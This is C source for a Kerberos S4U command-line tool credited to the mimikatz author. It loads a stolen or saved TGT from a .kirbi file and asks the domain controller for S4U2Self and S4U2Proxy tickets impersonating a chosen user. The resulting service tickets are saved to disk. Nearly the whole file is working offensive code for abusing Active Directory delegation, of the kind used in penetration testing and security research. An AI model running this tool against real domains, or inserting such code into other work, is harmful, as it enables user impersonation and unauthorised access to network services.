/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "s4u.h"

BOOL g_isAsn1Init = FALSE, g_isSockInit = FALSE, g_isKerberos = FALSE;

BOOL init()
{
	BOOL status = FALSE;
	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;

	if(g_isAsn1Init = kull_m_kerberos_asn1_helper_init())
		if(g_isSockInit = kull_m_sock_startup())
			if(g_isKerberos = kull_m_kerberos_helper_init())
				status = TRUE;
	return status;
}

BOOL term()
{
	if(g_isAsn1Init)
		g_isAsn1Init = !kull_m_kerberos_asn1_helper_term();
	if(g_isSockInit)
		g_isSockInit = !kull_m_sock_finish();
	if(g_isKerberos)
		g_isKerberos = !kull_m_kerberos_helper_term();

	return !(g_isAsn1Init || g_isSockInit || g_isKerberos);
}


int main(int argc, char * argv[])
{
	KULL_M_SOCK connectSocket;
	OssBuf ossTgtBuff, TgsReq = {0, NULL}, TgsReq2 = {0, NULL};
	KRB_CRED *cred = NULL;
	EncKrbCredPart *encCred = NULL;

	KDC_REP *TgsRep, *TgsRep2;
	EncKDCRepPart *encTgsRepPart, *encTgsRepPart2;
	DWORD len;
	PSTR dKdc, posU, pUser = NULL, pDomain = NULL, posS, pService = NULL, pTarget = NULL;
	PCSTR szFilename, szUser, szService;

	kprintf("\n"
		"  .#####.   " MIMIKATZ_FULL "\n"
		" .## ^ ##.  " MIMIKATZ_SECOND "\n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		"  '#####'                                                     * * */\n\n");	

	if(init())
	{
		if(kull_m_string_args_byName(argc, argv, "tgt", &szFilename, NULL))
		{
			if(kull_m_string_args_byName(argc, argv, "user", &szUser, NULL))
			{	
				if((posU = (char *) strchr(szUser, '@')) && (posU != szUser) && *(posU + 1))
				{
					pUser = (char *) szUser;
					pDomain = posU + 1;
					*posU = '\0';

					if(kull_m_string_args_byName(argc, argv, "service", &szService, NULL))
					{	
						if((posS = (char *) strchr(szService, '/')) && (posS != szService) && *(posS + 1))
						{
							pService = (char *) szService;
							pTarget = posS + 1;
							*posS = '\0';	

						}
						else PRINT_ERROR("No / separator between servicename and target (/service:servicename/target.fqdn.local) -- S4U2Proxy will not be used\n");
					}

					kprintf("TGT      | filename  : %s\n", szFilename);
					if(kull_m_file_readData(szFilename, &ossTgtBuff.value, (PDWORD) &ossTgtBuff.length))
					{
						if(!kull_m_kerberos_asn1_helper_ossDecode(KRB_CRED_PDU, &ossTgtBuff, (LPVOID *) &cred))
						{
							if(!kull_m_kerberos_asn1_helper_ossDecode(EncKrbCredPart_PDU, (OssBuf *) &cred->enc_part.cipher, (LPVOID *) &encCred))
							{
								if((cred->tickets->value.sname.name_type == KRB_NT_SRV_INST) && !_stricmp(cred->tickets->value.sname.name_string->value, "krbtgt") && cred->tickets->value.sname.name_string->next)
								{
									kprintf("TGT      | Service   : %s / %s @ %s\n", cred->tickets->value.sname.name_string->value, cred->tickets->value.sname.name_string->next->value, cred->tickets->value.realm);
									if((encCred->ticket_info->value.bit_mask & pname_present) && encCred->ticket_info->value.prealm)
									{
										kprintf("TGT      | Principal : %s @ %s\n", encCred->ticket_info->value.pname.name_string->value, encCred->ticket_info->value.prealm);
										if(kull_m_kerberos_helper_net_getDC(cred->tickets->value.realm, DS_KDC_REQUIRED, &dKdc))
										{
											if(kull_m_sock_initSocket(dKdc, KERBEROS_DEFAULT_PORT, IPPROTO_TCP, &connectSocket))
											{
												kprintf("S4U2Self | Principal : %s @ %s\n", pUser, pDomain);

												if(kull_m_kerberos_asn1_helper_build_KdcReqS4U2Self(encCred, cred, pUser, pDomain, &TgsReq))
												{
													if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
													{
														if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep_key(TgsRep, &encTgsRepPart, &encCred->ticket_info->value.key, EncTGSRepPart_PDU))
														{
															if(!(pService && pTarget))
															{
																*posU = '.';
																len = lstrlen(szUser);
																if(posU = (PSTR) LocalAlloc(LPTR, len + 7))
																{
																	RtlCopyMemory(posU, szUser, len);
																	RtlCopyMemory(posU + len, ".kirbi", 6);
																	kull_m_kerberos_helper_util_SaveRepAsKrbCred(TgsRep, encTgsRepPart, posU);
																	LocalFree(posU);
																}
															}
															else
															{
																kprintf("S4U2Proxy| Service   : %s / %s \n", pService, pTarget);
																if(kull_m_kerberos_asn1_helper_build_KdcReqS4U2Proxy(encCred, cred, &TgsRep->ticket, pService, pTarget, &TgsReq2))
																{
																	if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &TgsReq2, (LPVOID *) &TgsRep2, TGS_REP_PDU))
																	{
																		if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep_key(TgsRep2, &encTgsRepPart2, &encCred->ticket_info->value.key, EncTGSRepPart_PDU))
																		{
																			*posS = '.';
																			len = lstrlen(szService);
																			if(posS = (PSTR) LocalAlloc(LPTR, len + 7))
																			{
																				RtlCopyMemory(posS, szService, len);
																				RtlCopyMemory(posS + len, ".kirbi", 6);
																				kull_m_kerberos_helper_util_SaveRepAsKrbCred(TgsRep2, encTgsRepPart2, posS);
																				LocalFree(posS);
																			}
																			kull_m_kerberos_asn1_helper_ossFreePDU(EncTGSRepPart_PDU, encTgsRepPart2);
																		}
																	}
																}
															}
															kull_m_kerberos_asn1_helper_ossFreePDU(EncTGSRepPart_PDU, encTgsRepPart);
														}
														kull_m_kerberos_asn1_helper_ossFreePDU(TGS_REP_PDU, TgsRep);
													}
													kull_m_kerberos_asn1_helper_ossFreeBuf(TgsReq.value);
													kull_m_sock_termSocket(&connectSocket);
												}
											}
											LocalFree(dKdc);
										}
									}
								}
								else PRINT_ERROR("Ticket is not with krbtgt / KRB_NT_SRV_INST\n");
								kull_m_kerberos_asn1_helper_ossFreePDU(EncKrbCredPart_PDU, encCred);
							}
							else PRINT_ERROR("(cred) %s", kull_m_kerberos_asn1_helper_ossGetErrMsg());
							kull_m_kerberos_asn1_helper_ossFreePDU(KRB_CRED_PDU, cred);
						}
						else PRINT_ERROR("%s", kull_m_kerberos_asn1_helper_ossGetErrMsg());
						LocalFree(ossTgtBuff.value);
					}
					else PRINT_ERROR_AUTO("kull_m_file_readData");
				}
				else PRINT_ERROR("No @ separator between username and domain (/user:username@fqdn.local)\n");
			}
			else PRINT_ERROR("User argument (/user:username@fqdn.local) is missing\n");
		}
		else PRINT_ERROR("TGT argument (/tgt:filename.kirbi) is missing\n");
		term();
	}
	else PRINT_ERROR("init() failed\n");
	return 0;
}